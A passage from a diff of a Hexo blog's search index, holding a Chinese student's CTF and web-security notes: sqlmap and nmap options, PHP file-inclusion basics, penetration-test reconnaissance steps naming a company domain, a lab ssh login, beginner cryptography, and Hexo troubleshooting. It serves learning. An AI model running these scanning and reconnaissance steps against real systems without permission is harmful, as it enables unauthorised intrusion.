+<p>sqlmap常用参数：<br>-u : 指定目标URL，sql注入点<br>–cookie : 当前会话的cookie值<br>-b : 获取数据库类型 检索数据库管理系统的标识<br>（DBMS：Database Management System 数据库管理系统）<br>–current-db : 获取当前数据库<br>–current-user :获取当前登录数据库使用的用户</p>
+<h4 id="什么是序列化，为什么要序列化"><a href="#什么是序列化，为什么要序列化" class="headerlink" title="什么是序列化，为什么要序列化"></a>什么是序列化，为什么要序列化</h4><p><a href="https://blog.csdn.net/u011215133/article/details/51177843?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">https://blog.csdn.net/u011215133/article/details/51177843?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control</a></p>
+<h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p>一些简单的组合密码</p>
+<p><a href="https://blog.csdn.net/qq_37931597/article/details/87267829?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161700465316780255266108%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161700465316780255266108&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-87267829.first_rank_v2_pc_rank_v29&amp;utm_term=%E5%BC%B1%E5%8F%A3%E4%BB%A4&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/qq_37931597/article/details/87267829?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161700465316780255266108%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161700465316780255266108&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-87267829.first_rank_v2_pc_rank_v29&amp;utm_term=%E5%BC%B1%E5%8F%A3%E4%BB%A4&amp;spm=1018.2226.3001.4187</a></p>
+<h4 id="IP欺骗（XFF头等）"><a href="#IP欺骗（XFF头等）" class="headerlink" title="IP欺骗（XFF头等）"></a>IP欺骗（XFF头等）</h4><p><a href="https://blog.csdn.net/zz_Caleb/article/details/84147066">https://blog.csdn.net/zz_Caleb/article/details/84147066</a></p>
+<h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><p>一、什么是文件包含漏洞？</p>
+<p>1、文件包含概述</p>
+<p>和SQL注入等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。</p>
+<p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。</p>
+<p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
+<p>以PHP为例，常用的文件包含函数有以下四种：</p>
+<p>include()，require()，include_once()，require_once()</p>
+<p>区别如下：</p>
+<p>require()，找不到被包含的文件时会产生致命错误，并停止脚本运行。<br>include()，找不到被包含的文件时只会产生警告，脚本将继续运行。<br>include_once()与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br>require_once()与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br>版权声明：本文为CSDN博主「Monsterlz123」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/Monsterlz123/article/details/93964916">https://blog.csdn.net/Monsterlz123/article/details/93964916</a></p>
+<h4 id="关于msf"><a href="#关于msf" class="headerlink" title="关于msf"></a>关于msf</h4><p>最近了解到有msf，kali已经有了，win下也装好了，就差成功攻击一下windowsever2018 r2</p>
+<p>再尝试尝试</p>
+<h4 id="无法打开锁文件-var-lib-dpkg-lock-open-13-权限不够"><a href="#无法打开锁文件-var-lib-dpkg-lock-open-13-权限不够" class="headerlink" title="无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)"></a>无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)</h4><p><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/reprint.png" alt="img"></p>
+<p><a href="https://blog.csdn.net/rezrezre">rezrezre</a> 2017-06-26 16:27:17 <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/articleReadEyes.png" alt="img"> 32366 <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollect.png" alt="img"> 收藏 16</p>
+<p>分类专栏： <a href="https://blog.csdn.net/rezrezre/category_7020301.html">ubuntu</a></p>
+<p>输入apt-get install xxxxx，会提示</p>
+<h3 id="无法打开锁文件-var-lib-dpkg-lock-open-13-权限不够-无法对状态列表目录加锁-var-lib-dpkg-，请查看您是否正以-root-用户运行？"><a href="#无法打开锁文件-var-lib-dpkg-lock-open-13-权限不够-无法对状态列表目录加锁-var-lib-dpkg-，请查看您是否正以-root-用户运行？" class="headerlink" title="无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)  无法对状态列表目录加锁(/var/lib/dpkg/)，请查看您是否正以 root 用户运行？"></a><a href="http://blog.csdn.net/zlchina1989/article/details/6033198">无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)  无法对状态列表目录加锁(/var/lib/dpkg/)，请查看您是否正以 root 用户运行？</a></h3><p>解决：在前面加sudo</p>
+<p> 就是sudo apt-get install xxxxx</p>
+<h4 id="TCP-IP"><a href="#TCP-IP" class="headerlink" title="TCP/IP"></a>TCP/IP</h4><p><img src="/2021/02/01/web/mixed/1.jpg"></p>
+<p><img src="/2021/02/01/web/mixed/2.jpg"></p>
+<h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><h5 id="TOKEN"><a href="#TOKEN" class="headerlink" title="TOKEN"></a>TOKEN</h5><p>Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p>
+]]></content>
+      <tags>
+        <tag>攻防世界_web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>新手区</title>
     <url>/2020/10/09/web/%E6%96%B0%E6%89%8B%E5%8C%BA/</url>
     <content><![CDATA[<h4 id="View-source"><a href="#View-source" class="headerlink" title="View_source"></a>View_source</h4><p>直接进入查看器查看；</p>
@@ -1283,7 +1797,7 @@
 <p>原本的数据+摘要+算法——&gt;数据防篡改——&gt;真正包含了签名的</p>
 <h4 id="BUU"><a href="#BUU" class="headerlink" title="BUU"></a>BUU</h4><h5 id="1"><a href="#1" class="headerlink" title="1."></a>1.<img src="/2021/01/24/web/%E7%AB%AF%E5%8F%A3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(145).png"></h5><p>打开靶机后提示连接</p>
 <p>指令格式 ssh -p port</p>
-<p>根据题目提示，输入 ssh -p  27891 <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#x6e;&#111;&#x64;&#x65;&#51;&#46;&#98;&#117;&#x75;&#111;&#x6a;&#x2e;&#99;&#110;">&#114;&#x6f;&#x6f;&#x74;&#x40;&#x6e;&#111;&#x64;&#x65;&#51;&#46;&#98;&#117;&#x75;&#111;&#x6a;&#x2e;&#99;&#110;</a></p>
+<p>根据题目提示，输入 ssh -p  27891 <a href="mailto:&#114;&#111;&#x6f;&#x74;&#x40;&#x6e;&#x6f;&#100;&#x65;&#51;&#x2e;&#98;&#x75;&#x75;&#111;&#x6a;&#x2e;&#99;&#x6e;">&#114;&#111;&#x6f;&#x74;&#x40;&#x6e;&#x6f;&#100;&#x65;&#51;&#x2e;&#98;&#x75;&#x75;&#111;&#x6a;&#x2e;&#99;&#x6e;</a></p>
 <p>密码：123456</p>
 <p><img src="/2021/01/24/web/%E7%AB%AF%E5%8F%A3/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(144).png"></p>
 <p>连接上后，使用Linux指令执行</p>
@@ -1296,149 +1810,6 @@
 ]]></content>
       <tags>
         <tag>https协议</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mixed</title>
-    <url>/2021/02/01/web/mixed/</url>
-    <content><![CDATA[<h4 id="xss："><a href="#xss：" class="headerlink" title="xss："></a>xss：</h4><p>人们经常将跨站脚本攻击（Cross Site Scripting）缩写为CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，有人将跨站脚本攻击缩写为XSS。</p>
-<h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>Sqlmap -r后面跟着文件</p>
-<p>Sqlmap -u后面跟着路径（url）</p>
-<p>sqlmap常用参数：<br>-u : 指定目标URL，sql注入点<br>–cookie : 当前会话的cookie值<br>-b : 获取数据库类型 检索数据库管理系统的标识<br>（DBMS：Database Management System 数据库管理系统）<br>–current-db : 获取当前数据库<br>–current-user :获取当前登录数据库使用的用户</p>
-<h4 id="什么是序列化，为什么要序列化"><a href="#什么是序列化，为什么要序列化" class="headerlink" title="什么是序列化，为什么要序列化"></a>什么是序列化，为什么要序列化</h4><p><a href="https://blog.csdn.net/u011215133/article/details/51177843?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">https://blog.csdn.net/u011215133/article/details/51177843?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control</a></p>
-<h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p>一些简单的组合密码</p>
-<p><a href="https://blog.csdn.net/qq_37931597/article/details/87267829?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161700465316780255266108%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161700465316780255266108&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-87267829.first_rank_v2_pc_rank_v29&amp;utm_term=%E5%BC%B1%E5%8F%A3%E4%BB%A4&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/qq_37931597/article/details/87267829?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161700465316780255266108%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=161700465316780255266108&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-87267829.first_rank_v2_pc_rank_v29&amp;utm_term=%E5%BC%B1%E5%8F%A3%E4%BB%A4&amp;spm=1018.2226.3001.4187</a></p>
-<h4 id="IP欺骗（XFF头等）"><a href="#IP欺骗（XFF头等）" class="headerlink" title="IP欺骗（XFF头等）"></a>IP欺骗（XFF头等）</h4><p><a href="https://blog.csdn.net/zz_Caleb/article/details/84147066">https://blog.csdn.net/zz_Caleb/article/details/84147066</a></p>
-<h4 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h4><p>一、什么是文件包含漏洞？</p>
-<p>1、文件包含概述</p>
-<p>和SQL注入等攻击方式一样，文件包含漏洞也是一种“注入型漏洞”，其本质就是输入一段用户能够控制的脚本或者代码，并让服务器端执行。</p>
-<p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程就叫做包含。</p>
-<p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
-<p>以PHP为例，常用的文件包含函数有以下四种：</p>
-<p>include()，require()，include_once()，require_once()</p>
-<p>区别如下：</p>
-<p>require()，找不到被包含的文件时会产生致命错误，并停止脚本运行。<br>include()，找不到被包含的文件时只会产生警告，脚本将继续运行。<br>include_once()与include()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br>require_once()与require()类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。<br>版权声明：本文为CSDN博主「Monsterlz123」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/Monsterlz123/article/details/93964916">https://blog.csdn.net/Monsterlz123/article/details/93964916</a></p>
-<h4 id="关于msf"><a href="#关于msf" class="headerlink" title="关于msf"></a>关于msf</h4><p>最近了解到有msf，kali已经有了，win下也装好了，就差成功攻击一下windowsever2018 r2</p>
-<p>再尝试尝试</p>
-<h4 id="无法打开锁文件-var-lib-dpkg-lock-open-13-权限不够"><a href="#无法打开锁文件-var-lib-dpkg-lock-open-13-权限不够" class="headerlink" title="无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)"></a>无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)</h4><p><img src="https://csdnimg.cn/release/blogv2/dist/pc/img/reprint.png" alt="img"></p>
-<p><a href="https://blog.csdn.net/rezrezre">rezrezre</a> 2017-06-26 16:27:17 <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/articleReadEyes.png" alt="img"> 32366 <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollect.png" alt="img"> 收藏 16</p>
-<p>分类专栏： <a href="https://blog.csdn.net/rezrezre/category_7020301.html">ubuntu</a></p>
-<p>输入apt-get install xxxxx，会提示</p>
-<h3 id="无法打开锁文件-var-lib-dpkg-lock-open-13-权限不够-无法对状态列表目录加锁-var-lib-dpkg-，请查看您是否正以-root-用户运行？"><a href="#无法打开锁文件-var-lib-dpkg-lock-open-13-权限不够-无法对状态列表目录加锁-var-lib-dpkg-，请查看您是否正以-root-用户运行？" class="headerlink" title="无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)  无法对状态列表目录加锁(/var/lib/dpkg/)，请查看您是否正以 root 用户运行？"></a><a href="http://blog.csdn.net/zlchina1989/article/details/6033198">无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)  无法对状态列表目录加锁(/var/lib/dpkg/)，请查看您是否正以 root 用户运行？</a></h3><p>解决：在前面加sudo</p>
-<p> 就是sudo apt-get install xxxxx</p>
-<h4 id="TCP-IP"><a href="#TCP-IP" class="headerlink" title="TCP/IP"></a>TCP/IP</h4><p><img src="/2021/02/01/web/mixed/1.jpg"></p>
-<p><img src="/2021/02/01/web/mixed/2.jpg"></p>
-<h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><h5 id="TOKEN"><a href="#TOKEN" class="headerlink" title="TOKEN"></a>TOKEN</h5><p>Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p>
-]]></content>
-      <tags>
-        <tag>攻防世界_web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2020/11/05/x/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>goktech</title>
-    <url>/2021/01/31/x/goktech/</url>
-    <content><![CDATA[<h2 id="渗透测试思路"><a href="#渗透测试思路" class="headerlink" title="渗透测试思路"></a>渗透测试思路</h2><p>1． 信息收集</p>
-<p>2． 漏洞挖掘</p>
-<p>3． 漏洞利用</p>
-<p>4． 输出渗透测试报告</p>
-<p>信息收集：</p>
-<p>1.</p>
-<p>基本信息：</p>
-<p>域名信息 : goktech.cn</p>
-<p>子域名: 子域名挖掘机.exe  :bbs.goktech.cn   phpinfo,me</p>
-<p>ip地址：站长之家</p>
-<p>同ip地址的其他网站信息</p>
-<p>端口 80(http）443(https)</p>
-<p>服务，服务版本（web服务） 同网段的其他服务器信息（c段）</p>
-<p>信息泄露，GitHub.com 如qq.com user pass</p>
-<p>网站目录：御剑</p>
-<p>2.</p>
-<p>Os操作系统</p>
-<p>Linux windows mac等</p>
-<p>3.</p>
-<p>  Web中间件（web程序，用来提供网页服务）</p>
-<p>类型、版本：iis，apache，nginx，weblogic</p>
-<p>4.</p>
-<p>  数据库</p>
-<p>类型、版本：MySQL、mssql、Oracle、access</p>
-<p>5.</p>
-<p> 后编的脚本类型</p>
-<h3 id="Linux的指令"><a href="#Linux的指令" class="headerlink" title="Linux的指令"></a>Linux的指令</h3><p>ifconfig—查看ip地址</p>
-<p>dhclient—重新获取地址</p>
-<h4 id="namp-诸神之眼"><a href="#namp-诸神之眼" class="headerlink" title="namp,诸神之眼"></a>namp,诸神之眼</h4><p>#  namp -sS -p 80,443 10.10.10.1 -O</p>
-<p>-p 迅速扫描指定的端口</p>
-<p>-F  快速扫描100个常用的端口</p>
-<p>-r  顺序扫描，按从小到大的顺序进行端口扫描</p>
-<p>其他常用选项</p>
-<p>-sV 检测服务端软件版本信息</p>
-<p>-O  检测操作系统信息</p>
-<p>-Pn 禁用namp的主机检测功能</p>
-<p>-A 探测服务版本、对操作系统进行识别、进行脚本扫描、进行路由探测</p>
-<p><img src="http://rongcloud-web.qiniudn.com/docs_demo_rongcloud_logo.png"></p>
-]]></content>
-      <tags>
-        <tag>分享会</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>博客解疑</title>
-    <url>/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/</url>
-    <content><![CDATA[<h3 id="当输入hexo-g发布博文并预览时出现下面的提示："><a href="#当输入hexo-g发布博文并预览时出现下面的提示：" class="headerlink" title="当输入hexo -g发布博文并预览时出现下面的提示："></a>当输入hexo -g发布博文并预览时出现下面的提示：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line x, column y:</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
-
-<p>报错信息是提示hexo的yml配置文件 冒号后面少了空格 解决方案：到提示行将对应的空格补上即可。</p>
-<h4 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h4><p>如果标题用诸如[网鼎杯] 2020 青龙组AreUSerialz的时候，会出现报错</p>
-<p>原因猜测为hexo标题默认加上了[ ],我们再次添加这个符号就会产生报错。</p>
-<h3 id="hexo-s-时出现报错"><a href="#hexo-s-时出现报错" class="headerlink" title="hexo -s 时出现报错"></a>hexo -s 时出现报错</h3><p>Port 4000 has been used. Try other port instead.</p>
-<p>分析了一下，应该是我恰巧同时使用PHP study和hexo静态页面，所以占用了端口，查找文章获得方法：</p>
-<p>可以在站点下的文件_config.yml内加上如下代码更改hexo-server运行时的端口号：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 4001 #端口号随意，默认是4000</span><br><span class="line">  compress: true</span><br><span class="line">  header: true</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="About-photograph"><a href="#About-photograph" class="headerlink" title="About photograph"></a>About photograph</h3><p>今天再次尝试博客上传图片（好吧，都是因为之前自己不断失败，苦笑ing）</p>
-<p>重新看了下csdn上一篇好文章</p>
-<p>附上链接：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;xjm850552586&#x2F;article&#x2F;details&#x2F;84101345?ops_request_misc&#x3D;%25257B%252522request%25255Fid%252522%25253A%252522161371871416780266219548%252522%25252C%252522scm%252522%25253A%25252220140713.130102334..%252522%25257D&amp;request_id&#x3D;161371871416780266219548&amp;biz_id&#x3D;0&amp;utm_medium&#x3D;distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-84101345.pc_search_result_before_js&amp;utm_term&#x3D;hexo%25E5%259B%25BE%25E7%2589%2587</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>之后本地只需在文件的相同名文件夹下保存图片，然后markdown编辑时直接添加图片即可啦。</p>
-<p>注意：文章和同名文件夹需要在同一目录下，否则会显示丢失路径。</p>
-<h3 id="burp-intruder爆破出现-Payload-set-1-Invalid-number-settings的解决办法"><a href="#burp-intruder爆破出现-Payload-set-1-Invalid-number-settings的解决办法" class="headerlink" title="burp intruder爆破出现 Payload set 1: Invalid number settings的解决办法"></a>burp intruder爆破出现 Payload set 1: Invalid number settings的解决办法</h3><p>如果点击start attrack 后出现 Payload set 1: Invalid number settings 的提示，先点hex 后点 decimal 再开始start attrack，这是一个软件bug，需要手动让它刷新。<br><img src="https://img-blog.csdnimg.cn/20190901085439370.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190901085447734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ZqaDE5OTc=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h3 id="Python数据可视化利器Matplotlib，无法显示中文，怎么办？"><a href="#Python数据可视化利器Matplotlib，无法显示中文，怎么办？" class="headerlink" title="Python数据可视化利器Matplotlib，无法显示中文，怎么办？"></a>Python数据可视化利器Matplotlib，无法显示中文，怎么办？</h3><p><a href="https://zhuanlan.zhihu.com/p/104081310?utm_source=wechat_timeline">彻底解决Python里matplotlib不显示中文的问题 - 知乎 (zhihu.com)</a></p>
-<p>在自己的代码里加入如下代码：</p>
-<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">import matplotlib</span><br><span class="line">matplotlib.rc(&quot;font&quot;,family=&#x27;YouYuan&#x27;)</span><br></pre></td></tr></table></figure>
-
-<p>解决<img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210527201252662.png" alt="image-20210527201252662"></p>
-<h3 id="在使用phpstudy启动apache服务器时一直出现-PHP-startup-弹窗怎么办？"><a href="#在使用phpstudy启动apache服务器时一直出现-PHP-startup-弹窗怎么办？" class="headerlink" title="在使用phpstudy启动apache服务器时一直出现    PHP startup  弹窗怎么办？"></a>在使用phpstudy启动apache服务器时一直出现    PHP startup  弹窗怎么办？</h3><p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210726111000310.png" alt="image-20210726111000310"></p>
-<p>上网查找后得知，这于php.ini配制文件有关</p>
-<p>1.对于里面的扩展文件，若目录下无文件需要用；加以关闭。</p>
-<p><img src="/2020/10/15/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210726111308665.png" alt="image-20210726111308665"></p>
-<p>如图，这里的</p>
-<p>extension=php_xmlrpc.dll在对应文件夹里并没有，所以我们加上分号来关闭。</p>
-<p>2.路径的添加：</p>
-<p>打开php.ini，如找到extension_dir修改为：</p>
-<p><strong>extension_dir = “D:/Program/WAMP/php/ext”</strong></p>
-<p>引号内使用绝对路径即可。</p>
-]]></content>
-      <tags>
-        <tag>博客</tag>
       </tags>
   </entry>
   <entry>
@@ -1481,116 +1852,6 @@
 <h4 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web php unserialize"></a>Web php unserialize</h4><h4 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h4><h4 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h4>]]></content>
       <tags>
         <tag>攻防世界_web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>密码学</title>
-    <url>/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
-    <content><![CDATA[<p>密码：基本思想  伪装</p>
-<p>明文空间M 集合</p>
-<p>密文空间C  集合</p>
-<p>密钥空间K            Ke 加密钥   Kd 解密钥</p>
-<p>加密算法E：M—&gt;C</p>
-<p>解密算法D：C—-&gt;M   而且解密变换是加密变换的逆过程</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;img-blog.csdn.net&#x2F;20180831003945940?watermark&#x2F;2&#x2F;text&#x2F;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw&#x3D;&#x3D;&#x2F;font&#x2F;5a6L5L2T&#x2F;fontsize&#x2F;400&#x2F;fill&#x2F;I0JBQkFCMA&#x3D;&#x3D;&#x2F;dissolve&#x2F;70</span><br></pre></td></tr></table></figure>
-
-<p>共模<br>设a，b为正整数，如果用m分别除去a和b所得的余数相同，则称a和b关于模m同余<br>记作a=b<mod m><br>eg:1=27<mod26><br>(一个数除以比它大的数，余数为它本身）</mod26></mod></p>
-<p>密码学了解：</p>
-<p>1、<strong>对称密码算法</strong></p>
-<p>加密密钥和解密密钥相同（或者实质上等同，即从一个易推出另一个），</p>
-<p>• DES、3DES、IDEA、AES</p>
-<p>2、<strong>非对称密码算法</strong></p>
-<p>加密密钥和解密密钥不同，其中的加密密钥可以公开， 称为公开密钥，简称公钥；解密密钥必须保密，称为私人密钥，</p>
-<p>• RSA、ECC、ElGamal</p>
-<h3 id="3、编码方式"><a href="#3、编码方式" class="headerlink" title="3、编码方式"></a>3、<strong>编码方式</strong></h3><p>ASCII编码：ASCII在线转换地址：<a href="http://www.mokuge.com/tool/asciito16/">http://www.mokuge.com/tool/asciito16/</a></p>
-<h4 id="base家族编码"><a href="#base家族编码" class="headerlink" title="base家族编码"></a>base家族编码</h4><ul>
-<li>base2: 2进制</li>
-<li>base10: 10进制</li>
-<li>base16（HEX): 计算机字节表示，0<del>9，A</del>F，16位组成</li>
-<li>base32: 字母加数字，大写字母，234567,32位组成</li>
-<li>base64: 更大的表示范围,大小写字母，0~9，+，-,64位组成的。(做题时经常明显的等号==)</li>
-<li>base58: bitcoin为了比base64更易读采用的表示</li>
-</ul>
-<p>具体实现可以分为2种，能利用bit位直接转换的base(例如base2, base16,base32, base64),和不能利用bit位直接转换的base(例如base10, base58)。</p>
-<p><img src="/2020/10/18/x/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(182).png"></p>
-<p>关于base16，32，64的文章：<a href="https://blog.csdn.net/lili13897741554/article/details/82177472">https://blog.csdn.net/lili13897741554/article/details/82177472</a></p>
-<h4 id="misc的图形密码"><a href="#misc的图形密码" class="headerlink" title="misc的图形密码"></a>misc的图形密码</h4><p>（也是有关密码就记录在这里了）</p>
-<h5 id="1-猪圈密码"><a href="#1-猪圈密码" class="headerlink" title="1.猪圈密码"></a>1.猪圈密码</h5><p>这个应该很常见了（当然还包括很多变形</p>
-<p><img src="https://img-blog.csdnimg.cn/2020121317155637.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h5 id="2-圣堂武士密码-猪圈变形1"><a href="#2-圣堂武士密码-猪圈变形1" class="headerlink" title="2.圣堂武士密码-猪圈变形1"></a>2.圣堂武士密码-猪圈变形1</h5><p><img src="https://img-blog.csdnimg.cn/20201213171645589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FtaGVyc3RpZWFl,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
